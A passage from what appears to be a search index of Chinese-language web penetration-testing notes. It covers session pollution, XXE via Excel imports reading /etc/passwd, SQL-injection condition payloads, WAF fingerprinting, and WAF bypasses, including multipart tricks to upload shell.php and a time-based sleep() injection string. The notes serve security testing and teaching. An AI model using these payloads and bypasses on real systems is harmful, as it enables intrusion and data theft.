\u63a5\u5230\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u672c\u5730\u6a21\u62df\u7684\u4ee3\u7801\u4e0a\u9762\u6765","title":"DWR\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#hessian","text":"","title":"HESSIAN\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#gwt","text":"","title":"GWT\u63a5\u53e3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#sessionexc","text":"","title":"\u4e09\u3001\u8da3\u5473\u7684SESSION\u548cEXC"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#session","text":"\u573a\u666f\uff1a\u5728\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u65f6,\u5f88\u5e38\u89c1\u7684\u5199\u6cd5\u662f\u5148\u5c06\u9a8c\u8bc1\u7801\u5b58\u50a8\u4e8eSession\u5f53\u4e2d\uff0c\u5c06\u9a8c\u8bc1\u7801\u4f5c\u4e3a\u56fe\u7247\u6216\u662f\u624b\u673a\u9a8c\u8bc1\u7801,\u90ae\u7bb1\u7b49\u65b9\u5f0f\u53d1\u9001\u7ed9\u7528\u6237,\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u7684\u9a8c\u8bc1. \u901a\u5e38\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5f88\u5bb9\u6613\u5f15\u53d1\u4e00\u4e2a\u95ee\u9898, \u8be5\u573a\u666f\u5e38\u89c1\u4e8ephp\u4e2d:\u7528\u6237A\u627e\u56de\u5bc6\u7801,\u9700\u8981\u8fdb\u884c\u624b\u673a\u6821\u9a8c\u7801\u7684\u6821\u9a8c,\u670d\u52a1\u5668\u628a\u53d1\u9001\u51fa\u53bb\u7684\u9a8c\u8bc1\u7801\u653e\u5728\u4e86Session\u4e2d,\u6b64\u65f6\u7528\u6237\u5fc5\u987b\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\u624d\u80fd\u6210\u529f\u7684\u8fdb\u884c\u5bc6\u7801\u91cd\u7f6e \u573a\u666f: \u5728php\u4e2d,session\u4f7f\u7528\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8,\u5b83\u7684\u552f\u4e00\u6027\u4e0d\u662f\u5f88\u597d(\u591a\u4e2a\u5e94\u7528\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u4e2aSession) \u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51A\u4e0a\u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51B \uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u57df\u540d\u90fd\u89e3\u6790\u5230\u4e86\u540c\u4e00\u670d\u52a1\u5668\u4e0a,\u53ef\u80fd\u5c31\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u95ee\u9898 \u4f46\u662f\u5982\u679c\u5728\u6ca1\u53d1\u9001\u9a8c\u8bc1\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48session\u4e2dcode\u4e3a\u7a7a,\u518d\u5c06\u8bf7\u6c42\u63d0\u4ea4\u7684\u9a8c\u8bc1\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4f7f\u7528php\u7684\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4false == false\uff0c\u5373\u6761\u4ef6\u4e3a\u771f\uff0c\u9a8c\u8bc1\u7801\u5339\u914d\u6210\u529f\uff0c \u51fa\u73b0\u8fd9\u4e00\u95ee\u9898\u7684\u539f\u56e0\u662f\u7531\u4e8e\u670d\u52a1\u5668\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406session\uff0c\u5728\u4f7f\u7528\u4e4b\u540e\u5fc5\u987b\u5bf9\u5176\u8fdb\u884c\u9500\u6bc1,\u5e76\u4e14\u9700\u8981\u5bf9session\u8fdb\u884c\u7a7a\u9a8c\u8bc1 \u5728\u672a\u767b\u5f55http://admin.test.com\u7684\u60c5\u51b5\u4e0b,\u901a\u8fc7\u5148\u8bbf\u95eehttp:// www.test.com/ demo\u7ad9\u70b9\u5bf9\u81ea\u5df1\u7684session\u8fdb\u884c\u4e00\u6b21\u8d4b\u503c,\u4f2a\u9020\u51fa\u8eab\u4efd \u90a3\u4e48\u8fd9\u4e2asession\u662f\u53ef\u4ee5\u88abhttp://admin.test.com\u8bbf\u95ee\u5230\u7684,\u6240\u4ee5\u9020\u6210\u7684\u6df7\u6dc6\u4f7f\u7528 \u5f15\u53d1\u5b89\u5168\u95ee\u9898","title":"SESSION\u6c61\u67d3"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E4%BC%97%E6%B5%8B%E9%A1%B9%E7%9B%AE/#xxeexcel","text":"\u5e94\u7528\u573a\u666f\uff1a \u5728\u5f88\u591a\u7cfb\u7edf\uff0c\u4e0d\u7ba1\u662f\u540e\u53f0\u8fd8\u662f\u524d\u53f0\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\uff0c\u5bfc\u5165/\u5bfc \u51fa\u8fd9\u6837\u7684\u5b57\u6837\uff0c\u4ece\u7edf\u8ba1\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u767e\u5206\u4e4b\u516b\u5341\u4ee5\u4e0a\u90fd\u662fexcel\uff0c \u4f8b\u5982\uff0c\u5bfc\u5165\u4eba\u5458\u4fe1\u606f/\u5bfc\u51fa\u4eba\u5458\u4fe1\u606f\uff0c\u5f55\u5165\u7cfb\u7edf\u914d\u7f6e/\u5bfc\u51fa\u7cfb\u7edf\u914d \u7f6e\u7b49\u7b49 \u6280\u5de7\u53d8\u5f62\uff1a \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u6211\u4eec\u662f\u4e0d\u9700\u8981\u53bb\u4fee\u6539workbook.xml\uff0c\u6709\u65f6\u5019\u6211 \u4eec\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u7684\u5c31\u662f\uff0c\u5bfc\u51fa\u6765\u4e4b\u540e\uff0c\u7136\u540e\u6839\u636e\u683c\u5f0f\uff0c\u5916\u90e8\u5b9e\u4f53 \u5f15\u5165\uff0c\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u6bd4\u5982/etc/passwd\u7b49\uff0c\u53ef\u4ee5\u5728\u5bfc\u5165\u7684\u65f6\u5019 \u8fdb\u884c\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5e94\u8be5\u53bb\u4fee\u6539xl/worksheets/sheet1.xml \u8c03\u7528\u7684\u5b9e\u4f53 \u66ff\u6362\u6a21\u677f\u6570\u636e\u5373\u53ef\uff0c\u8fd9\u65f6\u5019\u5f53\u6211\u4eec\u5bfc\u5165\u65f6\u5019\uff0c\u5c31\u4f1a\u628a \u7cfb\u7edf\u654f\u611f\u6587\u4ef6\u8bfb\u53d6\u51fa\u6765","title":"XXE\u5728EXCEL\u4e2d\u7684\u5e94\u7528\u573a\u666f"},{"location":"%E6%8C%96%E6%B4%9E%E7%9B%B8%E5%85%B3/%E6%80%9D%E8%B7%AF%E6%96%B9%E6%B3%95/","text":"\u524d\u8a00 \u00b6 \u4e3b\u8981\u9488\u5bf9SRC\u548c\u4f17\u6d4b\uff0c\u63a2\u8ba8\u81ea\u5df1\u7684\u65b9\u6cd5 \u600e\u4e48\u5206\u6790\uff0c\u600e\u4e48\u53bb\u7ed5\uff0c\u600e\u4e48\u53bb\u83b7\u53d6\u8bc1\u636e\uff0c\u7b49\u7b49 \u4e00\u3001\u62e6\u622a\u6846\u67b6\u4e0b\u6ce8\u5165\u7684\u8fc7\u7a0b\u62c6\u89e3 \u00b6 \u8d8a\u6765\u8d8a\u591a\u7684web\u7cfb\u7edf\uff0c\u968f\u7740\u8fd0\u7ef4\u65b9\u5b89\u5168\u610f\u8bc6\u7684\u63d0\u9ad8\uff0c\u7f51\u7edc\u8bbe\u5907\u7684\u6295\u5165\uff0c \u4ee5\u53ca\u5b89\u5168\u7f16\u7801\u89c4\u8303\u7684\u4ecb\u5165\uff0c\u6f0f\u6d1e\u7684\u53d1\u73b0\u4ece\u8fc7\u53bb\u7684\u7b80\u5355\u7c97\u66b4\uff0c\u5230\u73b0\u5728\u4e3e\u6b65 \u7ef4\u8270\uff0c\u600e\u4e48\u53bb\u5224\u65ad\u6f0f\u6d1e\u7684\u5b58\u5728\uff0c\u8fdb\u800c\u6839\u636e\u6f0f\u6d1e\u83b7\u53d6\u8bc1\u636e\u6570\u636e\uff0c\u8fd9\u4e2a\u662f\u4e2a \u4f17\u6d4b\u5e73\u53f0\u9009\u624b\u7684\u75db\u70b9 1.\u6570\u636e\u5e93\u5c42\u9762\u57fa\u7840\u94fa\u57ab \u00b6 \u5224\u65ad\u6027SQL\u8bed\u53e5\u7684\u5f62\u5f0f \u6761\u4ef6\u5224\u65ad\u51fd\u6570\u65b9\u6cd5\u5206\u6790 mysql if ( 1 = ( select 1 REGEXP if ( 1 = 1 , 1 , 0x00 )), 1 , 1 ) = 1 IFNULL ( ascii ( substr ( user (), 1 , 1 )) / ( 114 % ascii ( substr ( user (), 1 , 1 ))), 'yes\u2019) IFNULL(hex(substr(user(),1,1))/(114%hex(substr(user(),1,1))),' yes\u2019 ) IFNULL ( 1 / ( locate ( substr ( user (), 1 , 1 ), 'r' )), 'yes\u2019) IFNULL(1/(locate(right(left(lower(user()),1),1),' r ')),' yes\u2019 ) left ( user (), 1 ) = \"r\" ; if ( 1 = 1 , 1 , 1 ) oracle NVL ( TO_CHAR ( DBMS_XMLGEN . getxml ( 'select 1 from dual where 1337>1' )), '1' ) != 1 NVL2 ( NULLIF ( substr ( 'abc' , 1 , 1 ), 'ca' ), 1 , 2 ) = 1 INSTR ( 'abcd' , 'b' , 2 , 1 ) > 0 2018 - 10 - 21 \u2019 - decode ( 1 , 21 , 1 , to_date ( decode ( 1 , 1 , '' , 's' ), 'yyyy -mm-dd' )) - \u2019 to_date ( decode ( substr ( user , 1 , 1 ), 'a' , '' , 's' ), 'yyyy-mm-dd\u2019)) decode(sign(INSTR(USER,' A ', 2, 1)),0,to_number(' x ' ), 1 ) sqlserver PATINDEX ( 'Wa%25' , 'Washington' ) > 0 right ( left ( lower ( 'abc' ), 1 ), 1 ) = 'a\u2019 isnull(nullif(substring(' abc ',1,1),' a '),' c ')=' c ' regexp_like ( 1 ,( case when 1 = 1 then 1 else 0 x00end )) \u901a\u7528\u578b\u5224\u65adSQL\u8bed\u53e5 2.\u5c42\u5c42\u9012\u8fdb\u5206\u6790WAF\u6c42\u8bc1\u636e \u00b6 waf\u7684\u539f\u7406 \u00b6 WAF\u7684\u53d1\u5c55\u4e3b\u8981\u7ecf\u5386\u4e86IPS\u67b6\u6784\uff0c \u53cd\u5411\u4ee3\u7406 \uff0c\u900f\u660e\u4ee3\u7406\u548c\u6d41\u6a21\u5f0f\u3002 WAF\u5173\u952e\u6280\u672f \u00b6 WAF\u900f\u660e\u4ee3\u7406\u6280\u672f\u539f\u7406 waf\u901a\u4fe1 WAF\u4e3b\u8981\u4f1a\u66f4\u6539\u5982\u4e0b\u6570\u636e\u5305\u5185\u5bb9\u9879\uff1a \u5ba2\u6237\u7aefTCP\u6e90\u7aef\u53e3 \u5ba2\u6237\u7aef\u6e90MAC/\u670d\u52a1\u5668\u6e90MAC\u5730\u5740 \u957f\u77ed\u8fde\u63a5\u534f\u8bae\u7248\u672c MIME\u7c7b\u578b waf\u7684\u8bc6\u522b \u00b6 \u57fa\u4e8eCookie\u503c \u00b6 Citrix Netscaler\uff082013\u5e74\u4f7f\u7528\u5e7f\u6cdb\uff09 Citrix Netscaler\u201d\u4f1a\u5728HTTP\u8fd4\u56de\u5934\u90e8Cookie\u4f4d\u7f6e\u52a0\u5165\u201cns_af\u201d\u7684\u503c\uff0c\u53ef\u4ee5\u4ee5\u6b64\u5224\u65ad\u4e3aCitrix Netscaler\u7684WAF\uff0c\u56fd\u5185\u6b64\u7c7bWAF\u5f88\u5c11 F5 BIG IP ASM F5 BiG IP ASM\u4f1a\u5728Cookie\u4e2d\u52a0\u5165\u201cTS+\u968f\u673a\u5b57\u7b26\u4e32\u201d\u7684Cookie\u4fe1\u606f\uff0c \u57fa\u4e8eHTTP\u54cd\u5e94 \u00b6 Mod_Security Mod_Security\u662f\u4e3aApache\u8bbe\u8ba1\u7684\u5f00\u6e90Web\u9632\u62a4\u6a21\u5757\uff0c\u4e00\u4e2a\u6076\u610f\u7684\u8bf7\u6c42Mod_Security\u4f1a\u5728\u54cd\u5e94\u5934\u8fd4\u56de\u201c406 Not acceptable\u201d WebKnight WebKnight\u662f\u7528\u6765\u8bbe\u8ba1\u5728IIS\u4e0b\u9762\u4f7f\u7528\u7684WAF\u8bbe\u5907\uff0c\u8f83\u4e3a\u5e38\u89c1\u3002WebKnight\u4f1a\u5bf9\u6076\u610f\u7684\u8bf7\u6c42\u8fd4\u56de\u201c999 No Hacking\u201d F5 BIG IP F5 BIG IP\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201c419 Unknown\u201d\u7684\u4fe1\u606f dotDefender dotDefender\u7528\u6765\u9632\u62a4.net\u7684\u7a0b\u5e8f\uff0c\u4f1a\u5bf9\u6076\u610f\u8bf7\u6c42\u8fd4\u56de\u201cdotDefender Blocked Your Request\u201d \u7279\u5b9a\u8d44\u6e90\u6587\u4ef6 \u00b6 \u90e8\u5206\u7279\u5b9aWAF\u5728\u8fd4\u56de\u7684\u544a\u8b66\u9875\u9762\u542b\u7279\u5b9a\u7684CSS\u6216\u8005JS\u6587\u4ef6\uff0c\u53ef\u4ee5\u4f5c\u4e3a\u5224\u65ad\u7684\u4f9d\u636e\uff0c\u8fd9\u7c7b\u60c5\u51b5\u5728WAF\u7c7b\u91cc\u6bd4\u8f83\u5c11\uff0c\u53ef\u5f52\u5e76\u5230HTTP\u54cd\u5e94\u4e2d\u3002 Sqlmap\u4e2dWaf\u68c0\u6d4b\u65b9\u6cd5\uff0881\u79cd\uff0c\u5305\u62ec360\uff0c\u5b89\u5168\u72d7\uff0csafe3\uff0c\u4e91\u9501\uff09 sqlmap . py - u \u201c http : // www . xxx . com \u201d -- identify - waf -- batch \u5168\u5c40\u8fc7waf\u7684\u51e0\u4e2a\u601d\u8003\u70b9 \u00b6 1. \u67b6\u6784\u5c42\u7ed5\u8fc7WAF \u00b6 1.1\u5bfb\u627e\u6e90\u7ad9 \u00b6 \u4fe1\u606f\u6cc4\u9732\u53d1\u73b0\u6e90\u7ad9IP \u601d\u8def\u592a\u591a\uff0c\u90ae\u4ef6 \u7a77\u4e3eIP\u5730\u5740 \u5b8c\u6210\u4e00\u6b21\u56fd\u5185IP\u626b\u63cf\u53ea\u9700\u89818-9\u5c0f\u65f6 1.2\u5229\u7528\u540c\u7f51\u6bb5 \u00b6 \u4e91\u670d\u52a1\u5546\u4e70\u4e00\u53f0VPS\uff0c\u901a\u8fc7VPS\u653b\u51fb\u76ee\u6807\u7ad9\u70b9\uff0c\u56e0\u4e3a\u6d41\u91cf\u662f\u5c40\u57df\u7f51\uff0c\u53ef\u80fd\u4e0d\u7ecf\u8fc7WAF\u68c0\u6d4b\uff0c\u5b9e\u73b0\u7ed5\u8fc7 1.3\u5229\u7528\u8fb9\u754c\u6f0f\u6d1e \u00b6 \u5bfb\u627e\u5b50\u7ad9\u7684SSRF\u6f0f\u6d1e\u3002\u5982\u679c\u5b50\u7ad9\u8bbf\u95ee\u76ee\u6807\u7ad9\u4e0d\u7ecf\u8fc7WAF\u96c6\u7fa4\uff0c\u53ef\u4ee5\u5229\u7528SSRF\u6f0f\u6d1e\u6765\u7ed5\u8fc7WAF 2. \u8d44\u6e90\u9650\u5236\u89d2\u5ea6\u7ed5\u8fc7WAF \u00b6 WAF\u53ea\u68c0\u6d4b\u524d\u9762\u7684\u51e0K\u5b57\u8282\u30011M\u3001\u62162M\uff0c\u53ea\u9700\u8981\u5728POST BODY\u524d\u9762\u6dfb\u52a0\u8bb8\u591a\u65e0\u7528\u6570\u636e\uff0c\u628a\u653b\u51fbpayload\u653e\u5728\u6700\u540e\u5373\u53ef\u7ed5\u8fc7WAF\u68c0\u6d4b 3 \u534f\u8bae\u5c42\u9762\u7ed5\u8fc7WAF\u7684\u68c0\u6d4b \u00b6 3.1\u534f\u8bae\u8986\u76d6\u4e0d\u5168 \u00b6 Waf\u672a\u80fd\u8986\u76d6Content-Type: multipart/form-data\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u6216\u8005WAF\u4f1a\u8ba4\u4e3a\u5b83\u662f\u6587\u4ef6\u4e0a\u4f20\u8bf7\u6c42\uff0c\u4ece\u800c\u53ea\u68c0\u6d4b\u6587\u4ef6\u4e0a\u4f20\uff0c\u5bfc\u81f4\u88ab\u7ed5\u8fc7 3.2\u534f\u8bae\u89e3\u6790\u4e0d\u6b63\u786e \u00b6 \u4f8b\u5982\u6587\u4ef6\u4e0a\u4f20\uff0c\u4e0a\u4f20\u6587\u4ef6\u540d\u7684\u4fee\u6539test.jpg/shell.php 3.3\u534f\u8bae\u89e3\u6790\u4e0e\u540eWEB\u5bb9\u5668\u7684\u534f\u8bae\u89e3\u6790\u4e0d\u4e00\u81f4 \u00b6 \u6587\u4ef6\u540d\u8986\u76d6 \u5728multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5757\u5b58\u5728\u591a\u4e2aContent-Disposition\uff0c\u5c06\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u7684filename\u503c\u4f5c\u4e3a\u4e0a\u4f20\u7684\u6587\u4ef6\u540d \u7b2c\u4e00\u4e2a\u6587\u4ef6\u540dshell.123 \u7b2c\u4e8c\u4e2ashell.php \u4e0a\u4f20\u540e\u662fshell.php Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\"\" Content-Disposition: form-data;name=\"myfile\"; filename=\"t3.jsp\" \u5728\u4e00\u4e2aContent-Disposition \u4e2d\uff0c\u5b58\u5728\u591a\u4e2afilename Content-Disposition: form-data;name=\"myfile\"; filename=\"p3.txt\";filename=\"t3.jsp\" \u9057\u6f0f\u6587\u4ef6\u540d \u5f53WAF\u9047\u5230\u201cname=\u201dmyfile\";;\u201d\u65f6\uff0c\u8ba4\u4e3a\u6ca1\u6709\u89e3\u6790\u5230filename\u3002\u800c\u540e\u7aef\u5bb9\u5668\u7ee7\u7eed\u89e3\u6790\u5230\u7684\u6587\u4ef6\u540d\u662ft3.jsp Content-Disposition: form-data;name=\"myfile\";; filename=\"t3.jsp\"\u3002 \u672a\u89e3\u6790\u6240\u6709\u6587\u4ef6 multipart\u534f\u8bae\u4e2d\uff0c\u4e00\u4e2aPOST\u8bf7\u6c42\u53ef\u4ee5\u540c\u65f6\u4e0a\u4f20\u591a\u4e2a\u6587\u4ef6\u3002\u5982\u56fe\uff0c\u8bb8\u591aWAF\u53ea\u68c0\u67e5\u7b2c\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\uff0c\u6ca1\u6709\u68c0\u67e5\u4e0a\u4f20\u7684\u6240\u6709\u6587\u4ef6\uff0c\u800c\u5b9e\u9645\u540e\u7aef\u5bb9\u5668\u4f1a\u89e3\u6790\u6240\u6709\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\uff0c\u653b\u51fb\u8005\u53ea\u9700\u628apaylaod\u653e\u5728\u540e\u9762\u7684\u6587\u4ef6PART \u6587\u4ef6\u540d\u89e3\u6790\u517c\u5bb9\u6027 multipart\u534f\u8bae\u4e2d\uff0c\u6587\u4ef6\u540d\u7684\u5f62\u5f0f\u4e3a\u201cfilename=\"abc.php\"\u201d\u3002\u4f46\u662fTomcat\u3001PHP\u7b49\u5bb9\u5668\u89e3\u6790\u534f\u8bae\u65f6\u4f1a\u505a\u4e00\u4e9b\u517c\u5bb9\uff0c\u80fd\u6b63\u786e\u89e3\u6790 \u201dfilename=\"abc.php\u201d\u3001\u201dfilename=abc.php\u201d\u3001 \u201dfilename='abc.php\u2019\u201d\u3002\u800cWAF\u53ea\u6309\u7167\u534f\u8bae\u6807\u51c6\u53bb\u89e3\u6790\uff0c\u65e0\u6cd5\u89e3\u6790\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u540e\u7aef\u5bb9\u5668\u80fd\u6b63\u786e\u83b7\u5f97\u6587\u4ef6\u540d\uff0c\u4ece\u800c\u5bfc\u81f4\u88ab\u7ed5\u8fc7\u3002\u573a\u666f\u7684\u7ed5\u8fc7\u5f62\u5f0f\uff1a Content-Disposition: form-data; name=\"file\"; filename=abc.php Content-Disposition: form-data; name=\"file\"; filename=\"abc.php Content-Disposition: form-data; name=\"file\"; filename='abc.php\u2019 3.4\u53c2\u6570\u6c61\u67d3 \u8bf7\u6c42\u4e2d\u5305\u542b2\u4e2a\u53c2\u6570\u540d\u76f8\u540c\u7684\u53c2\u6570typeid\uff0c\u7b2c\u4e00\u4e2a\u662f\u6b63\u5e38\u53c2\u6570\u7684\u503c\u6b63\u5e38\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u624d\u662fpayload\u3002\u5982\u679cWAF\u89e3\u6790\u53c2\u6570\u4f7f\u7528\u7b2c\u4e00\u4e2a\u503c\uff0c\u6ca1\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u503c\uff0c\u5c06\u5bfc\u81f4\u7ed5\u8fc7\u3002\u8fd9\u662f\u5f88\u4e45\u5f88\u4e45\u7684\u4e00\u4e2aCASE\uff0c\u73b0\u5728\u51e0\u4e4e\u6ca1\u6709WAF\u5b58\u5728\u8fd9\u4e2a\u95ee\u9898\u3002 /forum.php\uff1f typeid=644&typeid=if(now()%3dsysdate()%2csleep(19.844)%2c0)/ 'XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(19.844)%2c0))OR%22 / 4. \u89c4\u5219\u5c42\u9762\u7684\u7ed5\u8fc7 \u00b6 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u7ed5\u8fc7WAF\u89c4\u5219\u4e3b\u8981\u601d\u8003\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\u5728\u60f3\u4ec0\u4e48\uff0c\u5bb9\u6613\u5ffd\u7565\u4ec0\u4e48\uff0c\u63a8\u65ad\u4e00\u4e9b\u53ef\u80fd\u7ed5\u8fc7\u7684\u65b9\u5f0f\uff0c\u7136\u540e\u591a\u6b21\u5c1d\u8bd5\u8fdb\u884c\u9a8c\u8bc1\u3002\u96b6\u5c5e\u4e8e\u6f0f\u6d1e\u5c42\u9762\u8fc7waf 4.1. SQL\u6ce8\u5165\u7ed5\u8fc7 \u00b6 \u7ed5\u8fc7SQL\u6ce8\u5165\u89c4\u5219\u4e3b\u8981\u5229\u7528WAF\u89c4\u5219\u672c\u8eab\u7684\u95ee\u9898\u3001\u672a\u8003\u8651\u5230SQL\u8bed\u6cd5\u53d8\u5f62\u3001\u53ca\u540e\u7aef\u6570\u636e\u5e93SQL\u8bed\u53e5\u8bed\u6cd5\u7279\u6027 \u6ce8\u91ca\u7b26\u7ed5\u8fc7 / xxx /\u662f\u6ce8\u91ca\uff0c\u4e5f\u53ef\u4ee5\u5145\u5f53\u7a7a\u767d\u7b26\u3002\u56e0\u4e3a / /\u53ef\u4f7f\u5f97MySQL\u5bf9sql\u8bed\u53e5(union/ /select)\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u3002\u4e8b\u5b9e\u4e0a\u8bb8\u591aWAF\u90fd\u8003\u8651\u5230/**/\u53ef\u4ee5\u4f5c\u4e3a\u7a7a\u767d\u5206\uff0c\u4f46\u662fwaf\u68c0\u6d4b \u201c/*. */\u201d\u5f88\u6d88\u8017\u6027\u80fd\uff0c\u5de5\u7a0b\u5e08\u4f1a\u6298\u4e2d\uff0c\u53ef\u80fd\u5728\u68c0\u6d4b\u4e2d\u95f4\u5f15\u5165\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u4f8b\u5982\uff1a/ \\w+*/\u3002\u6216\u8005\uff0cWAF\u53ef\u80fd\u53ea\u4e2d\u95f4\u68c0\u67e5n\u4e2a\u5b57\u7b26\u201c/*.{,n}*/\u201d\u3002\u6839\u636e\u4ee5\u4e0a\u60f3\u6cd5\uff0c\u53ef\u4ee5\u9010\u6b65\u6d4b\u8bd5\u7ed5\u8fc7\u65b9\u6cd5\uff1a \u5148\u6d4b\u8bd5\u6700\u57fa\u672c\u7684\uff1aunion/**/select \u518d\u6d4b\u8bd5\u4e2d\u95f4\u5f15\u5165\u7279\u6b8a\u5b57\uff1aunion/ aaaa%01bbs /select \u6700\u540e\u6d4b\u8bd5\u6ce8\u91ca\u957f\u5ea6\uff1aunion/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /select \u540c\u7406\uff0c\u5bf9\u4e8e/ !xxx /\uff0c\u53ef\u4ee5\u91c7\u53d6\u7c7b\u4f3c\u7684\u601d\u8def\u7ed5\u8fc7WAF\u3002 \u7a7a\u767d\u7b26\u7ed5\u8fc7 \u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c SQL\u6ce8\u5165\u89c4\u5219\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u201c\\s\u201d\u5339\u914d\u7a7a\u683c\uff0c\u4f8b\u5982\u201dselect\\s+union\u201d\u3002\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7a7a\u767d\u7b26\u4e0eMySQL\u7a7a\u767d\u7b26\u7684\u4e0d\u540c\u53ef\u7ed5\u8fc7WAF\u89c4\u5219\u3002\u5982\u4f55\u8fd9\u4e9bMySQL\u7684\u7279\u6027\uff1f\u901a\u8fc7fuzz,\u6bcf\u6b21\u66f4\u6539\u6b63\u5e38SQL\u8bed\u53e5\u7684\u67d0\u90e8\u5206\uff0c\u66ff\u6362\u4e3a\u5176\u4ed6\u5b57\u7b26\uff0c\u5224\u65ad\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u5373\u53ef\u5224\u65ad\u51fa\u6765MySQL\u8bed\u6cd5\u7279\u6027\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5206\u6790MySQL\u8bcd\u6cd5\u6765\u53d1\u73b0\u8bed\u6cd5\u7279\u6027\uff0c\u4ece\u800c\u627e\u5230\u7ed5\u8fc7\u65b9\u6cd5\u3002 \u5229\u7528\u7a7a\u767d\u7b26\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6d4b\u8bd5WAF\u65f6\u5c3d\u53ef\u80fd\u51cf\u5c11\u5176\u4ed6\u539f\u56e0\u7684\u5f71\u54cd\uff0c\u4f8b\u5982\u201dunion select\u201d\u88ab\u62e6\u622a\uff0c\u53ea\u9700\u628a\u4e2d\u95f4\u7a7a\u767d\u7b26\u66ff\u6362\u4e3a\u201d%250C\u201d, \u201c%25A0\u201d\u8fdb\u884c\u7ed5\u8fc7\u6d4b\u8bd5\u3002 union%250Cselect union%25A0select \u51fd\u6570\u5206\u9694\u7b26 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u6211\u4eec\u731c\u6d4b\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\uff0c\u53ef\u80fd\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\uff0c\u6216\u8005\u9057\u6f0f\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\u3002\u4f8b\u5982\u5339\u914d\u51fd\u6570\u201dconcat()\u201d\u7684\u89c4\u5219\u5199\u6cd5\uff0c\u201cconcat(\u201d\u6216\u8005\u201dconcat\\s*(\u201d\uff0c\u5c31\u6ca1\u6709\u8003\u8651\u5230\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002\u76f8\u5e94\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u5728\u7279\u6b8a\u4f4d\u7f6e\u5f15\u5165\u7279\u6b8a\u7684\u5206\u9694\u7b26\uff0c\u9010\u4e2a\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7279\u6b8a\u5206\u9694\u7b26\u53d1\u73b0\u4e5f\u662f\u901a\u8fc7Fuzz\u51fa\u6765\u7684\u3002 concat%2520( concat/**/( concat%250c( concat%25a0( 